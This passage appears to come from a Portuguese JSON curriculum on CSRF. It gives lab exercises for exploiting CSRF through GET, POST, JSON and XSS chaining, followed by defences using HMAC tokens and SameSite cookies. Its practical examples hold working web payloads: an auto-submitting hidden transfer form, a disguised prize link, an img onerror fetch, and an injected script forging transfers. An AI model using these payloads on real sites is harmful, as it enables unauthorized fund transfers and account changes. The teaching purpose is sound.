                                  "verification": "Confirme mudança não autorizada no app vítima e capture evidências.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Navegador",
                                    "Logs do servidor",
                                    "Ferramenta de screenshot"
                                  ],
                                  "tips": "Use abas separadas para simular vítima navegando casualmente. Limpe dados após teste.",
                                  "learningObjective": "Demonstrar sucesso do CSRF e importância de mitigações como tokens.",
                                  "commonMistakes": [
                                    "Testar sem login ativo, perdendo autenticação.",
                                    "Não monitorar network/logs, perdendo prova.",
                                    "Confundir com XSS ao adicionar JS desnecessário."
                                  ]
                                }
                              ],
                              "practicalExample": "Crie bank.html: <html><body><h1>Grátis! Clique aqui</h1><form action='http://localhost/vuln/transfer' method='POST' id='poc'><input type='hidden' name='amount' value='1000'><input type='hidden' name='to' value='attacker123'></form><script>document.getElementById('poc').submit();</script></body></html>. Vítima logada acessa e transfere fundos automaticamente.",
                              "finalVerifications": [
                                "PoC executa sem interação manual da vítima.",
                                "Request inclui cookie de sessão válido da vítima.",
                                "Ação maliciosa (transferência/email) é realizada no app alvo.",
                                "Logs mostram origem da PoC (referer ou IP).",
                                "Ambiente é resetado sem danos persistentes.",
                                "Relatório inclui código, screenshots e análise."
                              ],
                              "assessmentCriteria": [
                                "Ambiente vulnerável configurado corretamente sem tokens CSRF.",
                                "PoC HTML forja request POST exato com parâmetros corretos.",
                                "Execução demonstra impacto real em lab controlado.",
                                "Documentação clara com evidências visuais.",
                                "Identificação de pelo menos 3 mitigações (tokens, SameSite, CORS).",
                                "Tempo total dentro de 2-3 horas, mostrando eficiência."
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento Web: HTML, JS, formulários e DevTools.",
                                "Redes e Protocolos: HTTP methods, headers, cookies e referer.",
                                "Ética e Legal: Uso responsável de PoCs em pentesting.",
                                "Programação: Servidores locais e debugging.",
                                "Análise de Riscos: OWASP Top 10 e segurança de apps."
                              ],
                              "realWorldApplication": "Em pentests e bug bounties, PoCs de CSRF comprovam vulnerabilidades em apps bancários/e-commerce, ajudando a priorizar fixes. Profissionais usam para treinar dev teams em defesas como CSRF tokens e SameSite=Strict cookies, prevenindo fraudes reais como transferências não autorizadas."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.3.1.2"
                            ]
                          },
                          {
                            "id": "10.1.4.3.2.2",
                            "name": "Explorar CSRF em diferentes métodos HTTP",
                            "description": "Analisar vulnerabilidades em requisições GET, POST, JSON e AJAX, explicando como cada uma pode ser explorada e por que GET é particularmente suscetível em URLs navegáveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Fundamentos de Métodos HTTP e CSRF",
                                  "subSteps": [
                                    "Estude as diferenças entre métodos HTTP: GET (idempotente, para leitura), POST (não idempotente, para criação/alteração).",
                                    "Revise o mecanismo de CSRF: atacante engana vítima para enviar requisição autenticada para site vítima.",
                                    "Identifique por que tokens CSRF são cruciais e como eles falham sem validação.",
                                    "Analise o fluxo de requisições cross-site via navegador.",
                                    "Liste exemplos de ações sensíveis em apps web (ex: transferência bancária, exclusão de conta)."
                                  ],
                                  "verification": "Resuma em um diagrama as diferenças entre GET/POST e como CSRF as explora.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação HTTP (MDN Web Docs)",
                                    "Artigo OWASP CSRF",
                                    "Ferramenta de desenho como Draw.io"
                                  ],
                                  "tips": "Use diagramas para visualizar fluxos; foque em idempotência de GET.",
                                  "learningObjective": "Compreender como métodos HTTP influenciam a suscetibilidade a CSRF.",
                                  "commonMistakes": [
                                    "Confundir GET com POST em termos de cacheabilidade",
                                    "Ignorar SameSite cookies como mitigação parcial"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar CSRF em Requisições GET",
                                  "subSteps": [
                                    "Configure um ambiente de teste com um endpoint vulnerável: GET /delete-account?userId=123.",
                                    "Crie uma página maliciosa com link <a href='http://victim.com/delete-account?userId=123'>Clique para ganhar prêmio</a>.",
                                    "Teste o ataque: logue na vítima, visite página maliciosa e observe a exclusão.",
                                    "Explique por que GET é suscetível: URLs navegáveis podem ser linkadas em emails/sites sem interação extra.",
                                    "Registre logs de requisição no Burp Suite ou DevTools."
                                  ],
                                  "verification": "Demonstre o PoC funcionando e capture screenshot do log de exclusão.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Burp Suite Community",
                                    "Servidor local (XAMPP ou Node.js)",
                                    "Navegador com DevTools"
                                  ],
                                  "tips": "Use parâmetros query visíveis para simular URLs reais; evite HTTPS em testes locais.",
                                  "learningObjective": "Demonstrar exploração prática de CSRF via GET e sua alta suscetibilidade.",
                                  "commonMistakes": [
                                    "Esquecer de manter sessão ativa na vítima",
                                    "Usar POST em vez de GET acidentalmente"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar CSRF em Requisições POST",
                                  "subSteps": [
                                    "Modifique o endpoint para POST /transfer-money com body {amount:1000, to:'attacker'}.",
                                    "Crie formulário malicioso oculto: <form action='http://victim.com/transfer-money' method='POST'><input type='hidden' name='amount' value='1000'> <input type='submit' style='display:none'></form> e dispare com JS.",
                                    "Teste o ataque induzindo submit automático via imagem ou link.",
                                    "Compare com GET: POST requer interação (submit), mas ainda vulnerável sem token.",
                                    "Analise headers (Origin/Referer) e por que podem ser spoofados."
                                  ],
                                  "verification": "Execute PoC POST e confirme transferência via logs do servidor vítima.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Editor HTML/JS",
                                    "Burp Suite para interceptar POST",
                                    "Servidor de teste com logs"
                                  ],
                                  "tips": "Use autocomplete='off' e visibility:hidden para formulários stealth; teste em iframe.",
                                  "learningObjective": "Entender limitações de POST contra CSRF e métodos de exploração.",
                                  "commonMistakes": [
                                    "Não ocultar submit button",
                                    "Ignorar validação de Referer fraca"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar CSRF em JSON/AJAX e Comparações Finais",
                                  "subSteps": [
                                    "Configure endpoint AJAX: POST /api/update-profile com JSON {email:'attacker@evil.com'}.",
                                    "Crie script malicioso usando fetch/XMLHttpRequest para enviar JSON cross-site.",
                                    "Teste limitações: CORS pode bloquear, mas se permitido, CSRF ocorre sem token.",
                                    "Compare todos: GET (mais fácil), POST (formulário), JSON/AJAX (JS avançado).",
                                    "Discuta mitigações: tokens sincronizador, SameSite=Strict."
                                  ],
                                  "verification": "Tabela comparativa de suscetibilidades e PoCs executados para cada método.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Postman para testar JSON",
                                    "CORS-enabled proxy se necessário",
                                    "Documentação Fetch API"
                                  ],
                                  "tips": "Simule CORS permissivo no servidor vítima para testes reais.",
                                  "learningObjective": "Comparar explorações CSRF por método HTTP e identificar padrões.",
                                  "commonMistakes": [
                                    "Assumir AJAX imune sem CORS check",
                                    "Esquecer Content-Type: application/json"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um app bancário vulnerável, endpoint GET /transfer?to=attacker&amount=1000 permite ataque via email com link 'Confira seu prêmio: http://bank.com/transfer?to=attacker&amount=1000'. Para POST, use <img src='x' onerror='fetch(\"http://bank.com/transfer\", {method:\"POST\", body:JSON.stringify({to:\"attacker\",amount:1000})})'> em site malicioso.",
                              "finalVerifications": [
                                "Explicar verbalmente por que GET é mais suscetível que POST em URLs navegáveis.",
                                "Executar PoC completo para GET, POST e JSON sem detecção inicial.",
                                "Identificar ausência de token CSRF em todos os cenários testados.",
                                "Listar 3 mitigações específicas por método.",
                                "Criar diagrama de ataque comparativo.",
                                "Simular defesa adicionando token e verificar falha do ataque."
                              ],
                              "assessmentCriteria": [
                                "Precisão na distinção de explorações por método HTTP (GET vs POST vs AJAX).",
                                "Qualidade dos PoCs: funcionais, documentados com screenshots/logs.",
                                "Profundidade na análise de suscetibilidades (ex: navegabilidade de GET).",
                                "Compreensão de mitigações e por que falham sem implementação.",
                                "Criatividade em exemplos reais e conexões com cenários práticos.",
                                "Clareza na tabela/diagrama comparativo."
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento Web: Construção de APIs seguras com Express.js/Node.",
                                "Redes e Protocolos: Análise de headers HTTP e CORS.",
                                "Ética e Direito: Implicações legais de testes de penetração.",
                                "Programação JavaScript: Uso de Fetch/XMLHttpRequest para simulações."
                              ],
                              "realWorldApplication": "Profissionais de cibersegurança usam isso para auditar apps web como bancos (ex: exploit histórico no Yahoo Mail via GET state-changing) ou e-commerces, prevenindo perdas financeiras por links maliciosos em phishing que exploram endpoints GET sensíveis."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.3.2.3",
                            "name": "Relacionar CSRF com XSS",
                            "description": "Explicar como XSS pode facilitar CSRF ao injetar scripts que forjam requisições, diferenciando os dois ataques e identificando cenários combinados em aplicações web modernas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos de CSRF e XSS Individualmente",
                                  "subSteps": [
                                    "Defina CSRF: Ataque que força o usuário autenticado a executar ações indesejadas em um site confiável via requisições forjadas.",
                                    "Defina XSS: Injeção de scripts maliciosos em páginas web visualizadas por outros usuários.",
                                    "Liste os mecanismos de proteção padrão: Tokens CSRF para CSRF e sanitização/escapagem para XSS.",
                                    "Identifique vetores comuns: CSRF via links/imgs/forms; XSS via inputs refletidos/armazenados/DOM-based.",
                                    "Revise exemplos básicos de PoCs para cada um usando ferramentas como Burp Suite."
                                  ],
                                  "verification": "Crie diagramas simples de fluxo de ataque para CSRF e XSS e explique-os em voz alta.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação OWASP para CSRF e XSS",
                                    "Ferramenta Burp Suite Community Edition",
                                    "Bloco de notas para diagramas"
                                  ],
                                  "tips": "Use analogias: CSRF é como um impostor usando suas credenciais; XSS é como contrabandear código executável.",
                                  "learningObjective": "Diferenciar conceitualmente CSRF e XSS como ataques distintos de segurança web.",
                                  "commonMistakes": [
                                    "Confundir CSRF com autenticação fraca",
                                    "Ignorar XSS DOM-based como vetor",
                                    "Subestimar a necessidade de tokens anti-CSRF mesmo com SameSite cookies"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Diferenciar Mecanismos e Impactos de CSRF vs. XSS",
                                  "subSteps": [
                                    "Compare origens: CSRF explora confiança de site (same-origin policy); XSS viola isolamento de scripts.",
                                    "Analise impactos: CSRF altera estado (ex: transferências); XSS rouba dados/sessões/executa ações.",
                                    "Estude defesas: CSRF (tokens, SameSite, CORS); XSS (CSP, WAF, encoding).",
                                    "Crie uma tabela comparativa com colunas: Vetor, Pré-requisitos, Detecção, Mitigação.",
                                    "Teste em labs vulneráveis como OWASP Juice Shop para observar diferenças."
                                  ],
                                  "verification": "Preencha e valide uma tabela comparativa com pelo menos 5 diferenças chave.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "OWASP Juice Shop ou PortSwigger WebSec Academy labs",
                                    "Planilha Google Sheets ou papel para tabela"
                                  ],
                                  "tips": "Lembre-se: CSRF requer vítima logada e interação; XSS pode persistir sem isso.",
                                  "learningObjective": "Identificar diferenças precisas nos vetores, pré-condições e mitigações de cada ataque.",
                                  "commonMistakes": [
                                    "Achar que SameSite mitiga XSS diretamente",
                                    "Confundir refletido XSS com CSRF via GET",
                                    "Ignorar que CSRF pode ser GET/POST/PUT"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explicar Como XSS Facilita CSRF via Injeção de Scripts Forjadores",
                                  "subSteps": [
                                    "Descreva o fluxo: XSS injeta <script> que gera requisição CSRF (ex: form submit automático).",
                                    "Analise bypass de proteções: XSS ignora SameSite se script roda no contexto da vítima.",
                                    "Codifique um PoC: Script XSS que faz fetch/XMLHttpRequest para endpoint CSRF-vulnerável.",
                                    "Teste em ambiente controlado: Injete XSS e observe execução de CSRF chained.",
                                    "Discuta por que isso é poderoso: Combina roubo de sessão (XSS) com alteração de estado (CSRF)."
                                  ],
                                  "verification": "Implemente e execute um PoC de XSS levando a CSRF em um lab local.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "DVWA ou bWAPP para labs locais",
                                    "Editor de código como VS Code",
                                    "Browser DevTools"
                                  ],
                                  "tips": "Use console do browser para depurar o script injetado e inspecionar network requests.",
                                  "learningObjective": "Entender o mecanismo técnico de chaining XSS → CSRF via scripts injetados.",
                                  "commonMistakes": [
                                    "Esquecer de incluir credenciais no fetch (withCredentials: true)",
                                    "Não considerar CSP bloqueando inline scripts",
                                    "Testar sem autenticação ativa"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Identificar Cenários Combinados em Aplicações Web Modernas",
                                  "subSteps": [
                                    "Mapeie cenários: SPAs com React/Vue (XSS DOM-based + CSRF em APIs); CMS como WordPress plugins.",
                                    "Analise apps reais: Brechas históricas como em Twitter/XSS ou banking apps.",
                                    "Desenvolva checklist para auditoria: Verificar inputs para XSS e endpoints para CSRF em chain.",
                                    "Simule mitigação: Adicione CSP, tokens e SameSite; re-teste o chain.",
                                    "Documente relatório de vulnerabilidade fictício destacando o risco composto."
                                  ],
                                  "verification": "Crie um checklist de auditoria e aplique a um site de teste, identificando 3+ riscos potenciais.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Relatórios OWASP Top 10",
                                    "Sites de teste como HackTheBox Web challenges",
                                    "Template de relatório Markdown"
                                  ],
                                  "tips": "Foco em APIs REST/GraphQL modernas onde CSRF é comum sem tokens adequados.",
                                  "learningObjective": "Reconhecer e mitigar cenários reais de ataques combinados CSRF+XSS.",
                                  "commonMistakes": [
                                    "Ignorar single-page apps sem forms tradicionais",
                                    "Subestimar XSS em third-party libs",
                                    "Não testar cross-origin chaining"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um blog vulnerável (ex: DVWA), um atacante injeta XSS via comentário: <script>fetch('/transfer?amount=1000&to=attacker', {credentials: 'include'});</script>. Isso rouba sessão via XSS e executa transferência via CSRF, drenando a conta da vítima logada que visualiza o comentário.",
                              "finalVerifications": [
                                "Explique verbalmente o fluxo completo de XSS facilitando CSRF em 2 minutos.",
                                "Identifique 3 diferenças chave entre CSRF puro e CSRF via XSS.",
                                "Codifique um PoC funcional e demonstre em lab.",
                                "Crie tabela comparativa validada por pares.",
                                "Aplique checklist a um app real e liste riscos.",
                                "Descreva 2 mitigações específicas para o chain."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual: Correta diferenciação e explicação do chaining (30%)",
                                "Profundidade técnica: PoC funcional e análise de bypass (25%)",
                                "Aplicação prática: Checklist e verificações em cenários reais (20%)",
                                "Completude: Todos elementos da expansão cobertos sem lacunas (15%)",
                                "Clareza: Diagramas/tabelas legíveis e explicações concisas (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento Web: Sanitização em frontend/backend (JS/PHP/Python).",
                                "Redes e Protocolos: Entendimento de HTTP headers (Origin, SameSite, CSP).",
                                "Programação Segura: Práticas de input validation e secure coding.",
                                "Análise de Malware: Similaridades com drive-by downloads chained.",
                                "Ética em TI: Implicações legais de disclosure de chains em pentests."
                              ],
                              "realWorldApplication": "Em auditorias de penetração (pentests) para bancos/e-commerces, identificar CSRF+XSS chains previne breaches massivos, como roubo de fundos; desenvolvedores usam isso para hardening de apps como dashboards admin em SaaS, reduzindo superfície de ataque em 40-60% conforme OWASP benchmarks."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.3.1.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.3.3",
                        "name": "Medidas de Proteção contra CSRF",
                        "description": "Estratégias e melhores práticas para prevenir ataques CSRF, focando em tokens sincronizados, cookies SameSite e validações de cabeçalhos.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.3.3.1",
                            "name": "Implementar tokens anti-CSRF",
                            "description": "Gerar e validar tokens únicos por sessão ou requisição usando funções hash criptográficas (ex: HMAC), integrando-os em formulários HTML e verificando no servidor para bloquear requisições forjadas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender CSRF e Planejar Tokens Anti-CSRF",
                                  "subSteps": [
                                    "Estude o conceito de Cross-Site Request Forgery (CSRF) lendo documentação OWASP.",
                                    "Analise exemplos de ataques CSRF em formulários de login ou transferências.",
                                    "Identifique por que tokens únicos por sessão ou requisição são necessários.",
                                    "Defina a estratégia: token baseado em HMAC com chave secreta e valor único (ex: timestamp + userID + nonce).",
                                    "Prepare o ambiente de desenvolvimento com servidor web (ex: Node.js/Express ou PHP)."
                                  ],
                                  "verification": "Escreva um resumo de 200 palavras explicando CSRF e o fluxo de tokens anti-CSRF, incluindo diagrama simples.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação OWASP CSRF Prevention Cheat Sheet",
                                    "Ferramenta de desenho como Draw.io",
                                    "Ambiente local: Node.js ou PHP com servidor"
                                  ],
                                  "tips": "Use exemplos reais como um site de banco para visualizar o risco; foque em requisições POST/PUT/DELETE.",
                                  "learningObjective": "Dominar o mecanismo de CSRF e o papel dos tokens sincronizador para mitigar ataques.",
                                  "commonMistakes": [
                                    "Confundir CSRF com XSS",
                                    "Ignorar que tokens devem ser por sessão para evitar reutilização",
                                    "Usar tokens previsíveis sem randomização"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Gerar Token Anti-CSRF no Servidor",
                                  "subSteps": [
                                    "Gere um valor único: combine timestamp atual, ID da sessão e nonce aleatório (crypto.randomBytes).",
                                    "Selecione uma chave secreta forte (armazenada em variável de ambiente).",
                                    "Compute o HMAC-SHA256 do valor único usando a chave secreta.",
                                    "Armazene o token HMAC na sessão do usuário (ex: req.session.csrfToken).",
                                    "Retorne o token para o cliente via resposta JSON ou meta tag."
                                  ],
                                  "verification": "Execute o endpoint de geração e confirme que o token é único e armazenado na sessão via console.log ou debugger.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Biblioteca crypto (Node.js) ou hash_hmac (PHP)",
                                    "Editor de código (VS Code)",
                                    "Chave secreta gerada por openssl rand -hex 32"
                                  ],
                                  "tips": "Regenere o token por requisição sensível para maior segurança; teste unicidade com múltiplas chamadas.",
                                  "learningObjective": "Implementar geração criptograficamente segura de tokens usando HMAC.",
                                  "commonMistakes": [
                                    "Usar MD5 em vez de SHA256",
                                    "Expor a chave secreta no código fonte",
                                    "Não incluir timestamp para prevenir replay attacks"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Integrar Token no Formulário HTML do Cliente",
                                  "subSteps": [
                                    "Crie um formulário HTML com action POST para uma ação sensível (ex: alterar senha).",
                                    "Inclua um campo hidden <input type='hidden' name='csrfToken' value='{{token}}'> obtido do servidor.",
                                    "Use JavaScript (se SPA) para fetch do token antes de renderizar o form.",
                                    "Adicione cabeçalho customizado (ex: X-CSRF-Token) para requisições AJAX.",
                                    "Garanta que o form só seja submetido após inclusão do token."
                                  ],
                                  "verification": "Inspecione o HTML gerado e confirme presença do campo hidden com token válido via DevTools.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "HTML/CSS/JS básico",
                                    "Template engine como EJS ou Pug (opcional)",
                                    "Browser com DevTools"
                                  ],
                                  "tips": "Para SPAs, use interceptors em Axios/Fetch para adicionar token automaticamente; evite storage local por risco de XSS.",
                                  "learningObjective": "Incorporar tokens anti-CSRF em interfaces web de forma segura e user-friendly.",
                                  "commonMistakes": [
                                    "Colocar token em URL (visível em logs)",
                                    "Não escapar o token no HTML (risco XSS)",
                                    "Esquecer em requisições AJAX"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar Validação do Token no Servidor",
                                  "subSteps": [
                                    "No handler POST, extraia o token do body (req.body.csrfToken) e da sessão (req.session.csrfToken).",
                                    "Recompute o HMAC do valor armazenado na sessão usando a mesma chave secreta.",
                                    "Compare os tokens com comparação de tempo constante (crypto.timingSafeEqual).",
                                    "Se inválido, retorne 403 Forbidden e limpe a sessão.",
                                    "Registre logs de falhas para monitoramento (sem expor tokens)."
                                  ],
                                  "verification": "Submeta form com token válido (sucesso 200) e inválido/removido (falha 403).",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Biblioteca crypto para timingSafeEqual",
                                    "Ferramenta Postman para testes POST",
                                    "Logger como Winston"
                                  ],
                                  "tips": "Use comparação segura para evitar timing attacks; invalide token após uso para one-time.",
                                  "learningObjective": "Validar tokens anti-CSRF de forma criptograficamente segura no backend.",
                                  "commonMistakes": [
                                    "Comparar strings com == (timing attack)",
                                    "Não limpar token usado (replay)",
                                    "Ignorar case-sensitive em comparação"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar e Reforçar a Implementação",
                                  "subSteps": [
                                    "Teste normal: submissão válida com token.",
                                    "Teste ataque: remova token ou use de outra sessão (deve falhar).",
                                    "Simule CSRF: abra form malicioso em outra aba e submeta cross-site.",
                                    "Verifique em múltiplos browsers e com cookies desabilitados.",
                                    "Adicione unit tests com Jest/Mocha para geração/validação."
                                  ],
                                  "verification": "Relatório de testes mostrando 100% bloqueio de CSRF simulados e 100% aprovação de legítimos.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Postman ou Burp Suite para simular ataques",
                                    "Framework de testes (Jest/PHPUnit)",
                                    "Dois browsers para cross-site test"
                                  ],
                                  "tips": "Use proxies como Burp para interceptar e modificar requests; automatize testes em CI/CD.",
                                  "learningObjective": "Validar a robustez da proteção anti-CSRF contra vetores reais de ataque.",
                                  "commonMistakes": [
                                    "Testar só em localhost (ignore CORS)",
                                    "Esquecer GET requests (geralmente safe)",
                                    "Não testar com sessões expiradas"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma app Node.js/Express para gerenciamento de banco, proteja o formulário de 'Transferir Fundos': gere token na rota GET /transfer, inclua em <input hidden>, valide em POST /transfer. Sem token, bloqueie e logue tentativa de CSRF de um site malicioso como 'fakebank.com'.",
                              "finalVerifications": [
                                "Token gerado é único por sessão e HMAC válido.",
                                "Formulário inclui token hidden corretamente.",
                                "Requisição sem token retorna 403.",
                                "Token inválido ou replay é rejeitado.",
                                "Logs capturam falhas sem expor dados sensíveis.",
                                "Testes cross-site confirmam proteção."
                              ],
                              "assessmentCriteria": [
                                "Token usa HMAC-SHA256 com chave secreta forte e valor imprevisível.",
                                "Integração cliente-servidor sincronizada sem exposição.",
                                "Validação usa comparação de tempo constante e invalidação pós-uso.",
                                "Cobertura de formulários POST/PUT/DELETE e AJAX.",
                                "Resistência comprovada a timing/replay/CSRF simulados.",
                                "Código limpo com comentários e tratamento de erros."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Aplicação prática de HMAC e funções hash.",
                                "Desenvolvimento Web: Integração full-stack (HTML/JS/Server).",
                                "Gestão de Sessões: Armazenamento seguro de state.",
                                "Testes de Segurança: Simulação de ataques OWASP Top 10.",
                                "DevOps: Logging e monitoramento em produção."
                              ],
                              "realWorldApplication": "Bancos online como Nubank usam tokens anti-CSRF em todos os formulários de transações financeiras para prevenir que sites maliciosos (ex: phishing) forjem transferências em nome do usuário logado, salvando bilhões em fraudes anuais."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.3.1.3"
                            ]
                          },
                          {
                            "id": "10.1.4.3.3.2",
                            "name": "Configurar atributos SameSite em cookies",
                            "description": "Aplicar atributos Lax, Strict e None nos cookies de sessão para prevenir envio automático em requisições cross-site, testando comportamentos em navegadores modernos como Chrome e Firefox.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Atributos SameSite em Cookies",
                                  "subSteps": [
                                    "Estude a definição de cookies de sessão e seu papel em autenticação web.",
                                    "Analise o atributo SameSite=Lax: permite envio em top-level GETs e safe methods cross-site.",
                                    "Analise o atributo SameSite=Strict: bloqueia completamente envios cross-site.",
                                    "Analise o atributo SameSite=None: requer Secure e permite todos os cross-site, para compatibilidade com terceiros.",
                                    "Compare com o comportamento padrão (Lax em navegadores modernos)."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito as diferenças entre Lax, Strict e None, com exemplos de cenários de uso.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação MDN Web Docs sobre SameSite",
                                    "Artigo OWASP sobre CSRF e SameSite"
                                  ],
                                  "tips": "Use diagramas para visualizar fluxos de requisições same-site vs cross-site.",
                                  "learningObjective": "Dominar os comportamentos de cada valor de SameSite e quando usá-los contra CSRF.",
                                  "commonMistakes": [
                                    "Confundir Lax com Strict (Lax permite alguns cross-site safe).",
                                    "Ignorar que None requer Secure em HTTPS apenas."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Cookies com Atributos SameSite no Servidor",
                                  "subSteps": [
                                    "Crie um servidor web simples (Node.js/Express ou PHP) com endpoint de login que define cookie de sessão.",
                                    "Implemente Set-Cookie com SameSite=Lax: res.setHeader('Set-Cookie', 'session=abc; SameSite=Lax; Path=/');",
                                    "Implemente variações para Strict e None (com Secure para None).",
                                    "Teste localmente com curl ou Postman para verificar headers de resposta.",
                                    "Adicione HttpOnly e Secure flags para melhores práticas."
                                  ],
                                  "verification": "Inspecione headers de resposta no DevTools e confirme presença correta de SameSite.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Node.js ou PHP instalado",
                                    "Editor de código (VS Code)",
                                    "Documentação Express.js ou PHP setcookie()"
                                  ],
                                  "tips": "Sempre teste em HTTPS localhost para None; use mkcert para certs locais.",
                                  "learningObjective": "Configurar headers Set-Cookie corretamente para proteção CSRF via SameSite.",
                                  "commonMistakes": [
                                    "Esquecer Path=/ para cobrir toda a app.",
                                    "Usar SameSite=None sem Secure, causando rejeição."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Simular Ambiente Cross-Site para Testes",
                                  "subSteps": [
                                    "Crie dois servidores locais: app principal (porta 3000) e site 'malicioso' (porta 3001).",
                                    "No app principal, adicione página protegida (ex: /delete-post) que requer cookie de sessão.",
                                    "No site malicioso, crie formulário auto-submit para POST /delete-post no app principal.",
                                    "Configure cookie no app principal com SameSite=Strict/Lax/None alternadamente.",
                                    "Carregue site malicioso em aba separada após login no principal."
                                  ],
                                  "verification": "Confirme que formulário malicioso é renderizado mas ação falha sem cookie no Network tab.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "Dois terminais para servidores locais",
                                    "Ferramentas DevTools do navegador"
                                  ],
                                  "tips": "Use iframes ou links para simular cross-site real; evite same-origin.",
                                  "learningObjective": "Reproduzir cenários CSRF reais para validar SameSite.",
                                  "commonMistakes": [
                                    "Testar em same-site acidentalmente (diferentes portas são cross-site).",
                                    "Ignorar preflights CORS que podem interferir."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar Comportamentos em Chrome e Firefox",
                                  "subSteps": [
                                    "Login no app principal, inspecione cookie no Application/Storage tab.",
                                    "Navegue para site malicioso, submeta ação cross-site, monitore Network tab.",
                                    "Teste GET top-level (link) vs POST em iframe para Lax.",
                                    "Repita com Strict (deve falhar tudo cross-site) e None (deve permitir).",
                                    "Compare logs de console e rejeições de cookie entre Chrome e Firefox."
                                  ],
                                  "verification": "Documente screenshots de Network tab mostrando cookie ausente em requisições cross-site.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Chrome e Firefox atualizados",
                                    "Extensões como Cookie Editor opcional"
                                  ],
                                  "tips": "Ative 'Preserve log' no Network tab; limpe cookies entre testes.",
                                  "learningObjective": "Validar e depurar SameSite em navegadores modernos.",
                                  "commonMistakes": [
                                    "Não limpar cookies/site data entre configurações.",
                                    "Confundir com bloqueios CORS ao invés de SameSite."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Analisar Resultados e Implementar Melhores Práticas",
                                  "subSteps": [
                                    "Registre comportamentos observados vs esperados em tabela comparativa.",
                                    "Escolha SameSite ideal por ação (Strict para admin, Lax para geral).",
                                    "Integre token CSRF adicional como dupla proteção.",
                                    "Teste em modo incógnito para isolamento.",
                                    "Atualize código para fallback se SameSite não suportado."
                                  ],
                                  "verification": "Crie relatório de 1 página com achados e código final.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Planilha ou Markdown para tabela",
                                    "Documentação caniuse.com para suporte SameSite"
                                  ],
                                  "tips": "Priorize Strict onde possível; Lax é bom default.",
                                  "learningObjective": "Aplicar SameSite otimizado e combinar com outras defesas CSRF.",
                                  "commonMistakes": [
                                    "Usar None desnecessariamente, reduzindo segurança.",
                                    "Ignorar suporte legado (IE não suporta)."
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva um app de e-commerce onde login define cookie de sessão com SameSite=Strict. Crie email phishing simulado (página separada) com botão 'Confirme Pedido' que faz POST /cancel-order cross-site. Teste: com Strict, cookie não é enviado, ação falha sem CSRF token adicional.",
                              "finalVerifications": [
                                "Cookie com SameSite=Strict não é enviado em qualquer requisição cross-site.",
                                "SameSite=Lax permite top-level navigation GET mas bloqueia POST cross-site.",
                                "SameSite=None funciona apenas com Secure em HTTPS e permite tudo.",
                                "Comportamentos consistentes em Chrome v80+ e Firefox v60+.",
                                "Nenhuma ação sensível é executada via CSRF simulado."
                              ],
                              "assessmentCriteria": [
                                "Configuração precisa de Set-Cookie com SameSite variados (100% headers corretos).",
                                "Testes cross-site reproduzem falhas esperadas em 4 cenários.",
